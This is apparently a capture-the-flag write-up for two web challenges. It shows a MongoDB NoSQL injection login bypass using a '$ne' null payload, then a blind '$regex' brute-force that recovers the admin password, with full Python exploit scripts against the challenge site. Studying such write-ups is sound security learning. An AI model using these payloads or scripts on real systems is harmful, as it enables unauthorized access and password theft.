This blog post contains the writeup for two challenges (No SEQUELS & No SEQUELS 2), because they are related.

So let's start with No SEQUELS first.

# 1. No SEQUELS 1

**Category:** Web  
**Points:** 50  

-----------------------------

## 1.2 Challenge Description 
> The prequels sucked, and the sequels aren't much better, but at least we always have the [original trilogy](https://nosequels.2019.chall.actf.co).

> Hint said : *MongoDB is a safer alternative to SQL, right?*

#### 1.3 What we can get from the informations stated above ?

- They are using MongoDB as a NoSQL engine.
- we can guess from hint that its a simple Auth bypass with MongoDB NoSQL injection.

We are presented a part of the source code of how the authentication happens.

![no_sequels_source_code](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1556371044/1_xKB1P9_JsMbdjYLkCsnHvw.png)

### 1.4 Exaplanation

This simple authentication uses `JWT` (JSON Web Tokens), trying to hack the token won't help because the JWT token is being signed with a `secret key` and we don't know the key actually.

After reading the code, this is clearly a NoSQL Injection because of unsanitized user input.

The following two lines show that the variables username and password are not sanitized by anyway.

```js
var user = req.body.username;
var pass = req.body.password;
```

One more thing to notice, the line below show that the body can be parser using json regarded that we supply some json input with `Content-Type: application/json`.

```js
app.use(bodyParser.json());
```

NoSQL databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional `SQL` syntax.

The unsanitisation of username and password will lead to NoSQL code injection.  

What would happen if we post the following JSON data:

```http
POST https://nosequels.2019.chall.actf.co HTTP/1.1
Content-Type: application/json
{
    "username": {"$ne": null},
    "password": {"$ne": null}
}
```

By Sending this payload the username & password will be parsed as so, thus the query being  

```javascript
var query = {
    username: {"$ne": null};
    password: {"$ne": null};
}
    
```

Now, executing the line below from the app source code will return the first row, and we will be authenticated.  

```javascript
db.collection('users').findOne(query, function(err, user) {
    if (!user) {
        res.send("Wrong username or password");
        return 
    }
    res.cookie('token', jwt.sign({name: user.username, authnticated: true}, secret));
    res.redirect("/site");
});
```
Let's write a script to do the work for us, and get that first `FLAG`.

We will be using python requests module.  


```python
import requests
import re
URL = "https://nosequels.2019.chall.actf.co/login"
payload = '{"username": {"$ne": null}, "password": {"$ne": null}}'
cookies = {"token": "still_dont_know"} 
# we could have done it manually, and replaced the token with
# the token that your browser got for you

# init session
session = requests.Session()
# set re expression for token in headers
jwt_token_re = re.compile(r"token=(.*);")
# Getting the token for the first time

token_req = session.get(URL)
if token_req.status_code == 200:
    m = re.search(jwt_token_re, token_req.headers["Set-Cookie"])
    if m:
        # update token in cookies dict
        cookies["token"] = str(m.group(1))

    # Now let's send the json payload alongside the cookie we got above.
    # we will leave requests default behaviour to follow redirects which will redirect us to /site

flag_re = re.compile(r"actf{.*}")

# make request with mallicious payload

req = session.post(URL, json=payload, cookies=cookies, verify=False)
# verify=False is just for HTTPS connection

if req.status_code == 200:
    # FLAG match
    m = re.search(flag_re, req.text)
    if m:
        print("1st FLAG: ", m.group(0)) 
```

**`FLAG is : actf{no_sql_doesnâ€™t_mean_no_vuln}`**

`NOTE: we could have done the same thing using BurpSuite: first we send the query, intercept it using BurpSuite, change Content-Type to application/json and modify the body with our json payload. :D`


# 2. No SEQUELS 2

Let's see the solution for NoSEQUELS 2

if we copy the last token we got after sending the json payload, we can now request **`/site`** (using a GET request of course) and we are presented with the following page.

![site_page](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1556487393/1_zD92g6-1Z1HnRlHcfkrbBg.png)

It says `suspicious activity detected` and we need to provide the password for user **`admin`** and one more thing, it says that there will be no database query!!!.

### 2.1 Things we can derive from the above.

1. `admin` user exists.
2. the exploitation will be on the previous login page, because we can't do no database query here.

So, we need to get the correct password for `admin`, and we will do it using `$regex` and also we need to do it in a Blind way

Here is the payload we will be using

```json
new_payload = {"username": {"$eq": "admin" }, "password": {"$regex": "^some_chars.*"}}
```

So basically, we will be bruteforcing the password by checking it against a regular expression pattern.

#### 2.2 Example

let's say we send the following payload

```json
payload = {"username": {"$eq": "admin" }, "password": {"$regex": "^c.*"}}
```

if we get a 302 status code (a redirect to `/site`) then the password does indeed start with a **`c`**, now we can build our final Blind NoSQL exploitation script using python

You can also get the password length using **`$regex`** again, with this payload **`.{number}`**, i already found the password length to be equal to `14`.

### 2.3 Final Exploit Script, (fully automated)


```python
import requests # used to make requests
import string   # for building the password
import re       # for cheking token pattern and FLAG pattern

session = requests.Session() # creates a session, not really needed tho.
cookies = {"token": "fucking_dont_know_1337"}
URL = "https://nosequels.2019.chall.actf.co/login"

# make first GET request.
# this is only done to get the first unauthenticated token
jwt_token_re = re.compile(r"token=(.*);")
dummy = session.get(URL)

if dummy.status_code == 200:
    m = re.search(jwt_token_re, dummy.headers["Set-Cookie"])
    if m:
        cookies["token"] = str(m.group(1))
        print("[?] Cookie set")

# Creates new payload
new_payload = {"username": {"$eq": "admin" }, "password": {"$regex": None}}


restart_the_damn_loop = True # control the loop, no one want an infinite loop
regex_payload = "" # this is the current compared password 
flag = regex_payload # flag is initialized as regex payload == ""

while restart_the_damn_loop:
    restart_the_damn_loop = False
    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        regex_payload += i
        new_payload["password"]["$regex"] = "^"+regex_payload + ".*"
        req = session.post(URL, verify=False, cookies=cookies, json=new_payload, allow_redirects=False)
        if req.status_code == 302: # a 302 repsonse code means payload passed
            restart_the_damn_loop = True
            flag += i
            if len(flag) == 14: # check if length == 14
                restart_the_damn_loop = False
                m = re.search(jwt_token_re, req.headers["Set-Cookie"])
                if m:
                    # sets the token cookie, we will use it when visiting /site
                    cookies["token"] = str(m.group(1))
                print("[?] pass till now : ", flag)
                break
        else:
            regex_payload = flag
            restart_the_damn_loop = True


# make last request and get the damn flag.

print("Password: " + flag)
URL = "https://nosequels.2019.chall.actf.co/site"

# POST Parameter for /site page is named : pass2
r = session.post(URL, verify=False, data={"pass2": flag}, cookies=cookies)
# setting verify=False is only better when solving CTF challenges.
# because we dont need it :D   
m = re.search(r"actf{.*}", r.text)
if m:
    print("[+] FLAG: ", m.group(0))

```


An here is the flag: **`actf{still_no_sql_in_the_sequel}`**

Thanks for reading! :D
